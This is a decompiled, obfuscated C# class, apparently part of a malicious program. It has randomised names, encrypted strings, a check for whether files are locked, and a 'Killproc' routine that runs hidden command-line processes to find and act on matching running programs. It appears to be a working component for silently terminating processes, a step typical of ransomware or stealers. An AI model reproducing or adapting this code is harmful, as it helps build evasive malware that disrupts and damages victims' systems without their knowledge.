using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fAuBSMaVICral;

internal sealed class mnpRWvvbrJgHv
{
	private sealed class iwHrcKpeCg
	{
		public string NfsdOjbxzuez;

		public bool _003CKillproc_003Eb__4(string string_0)
		{
			return string_0.Contains(NfsdOjbxzuez);
		}
	}

	public static readonly List<string> bZSAzTgvYdBUfu;

	public static readonly List<string> kwhPaNahVk;

	private static Func<string, string[]> CS_0024_003C_003E9__CachedAnonymousMethodDelegate8;

	private static Func<string[], string> CS_0024_003C_003E9__CachedAnonymousMethodDelegate9;

	[NonSerialized]
	internal static GetString getString_0;

	public static bool cJzqbOCqGLtS(string string_0)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(string_0, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(string_0, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void WtlWQnLheONJif(string string_0)
	{
		iwHrcKpeCg CS_0024_003C_003E8__locals0 = new iwHrcKpeCg();
		CS_0024_003C_003E8__locals0.NfsdOjbxzuez = string_0;
		try
		{
			string text = DQbeXymomkFe(YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107365190)), YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107365141)));
			string[] separator = new string[1] { getString_0(107396690) };
			string[] source = text.Split(separator, StringSplitOptions.None);
			IEnumerable<string> source2 = source.Where((string string_0) => string_0.Contains(CS_0024_003C_003E8__locals0.NfsdOjbxzuez));
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate8 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate8 = (string string_0) => string_0.Split(new char[1] { ',' });
			}
			IEnumerable<string[]> source3 = source2.Select(CS_0024_003C_003E9__CachedAnonymousMethodDelegate8);
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate9 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate9 = (string[] string_0) => string_0[1].Replace(getString_0(107350816), getString_0(107352564));
			}
			List<string> list = source3.Select(CS_0024_003C_003E9__CachedAnonymousMethodDelegate9).ToList();
			foreach (string item in list)
			{
				DQbeXymomkFe(YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107350539)), YpCGOwjDWwATs.gUlAYNDfQee(getString_0(107365116)) + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string DQbeXymomkFe(string string_0, string string_1)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(string_0, string_1);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding(getString_0(107365131));
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + getString_0(107365122) + ex.StackTrace;
		}
	}

	private static string[] _003CKillproc_003Eb__5(string string_0)
	{
		return string_0.Split(new char[1] { ',' });
	}

	private static string _003CKillproc_003Eb__6(string[] string_0)
	{
		return string_0[1].Replace(getString_0(107350816), getString_0(107352564));
	}

	static mnpRWvvbrJgHv()
	{
		Strings.CreateGetStringDelegate(typeof(mnpRWvvbrJgHv));
		bZSAzTgvYdBUfu = new List<string>();
		kwhPaNahVk = new List<string>();
	}
}
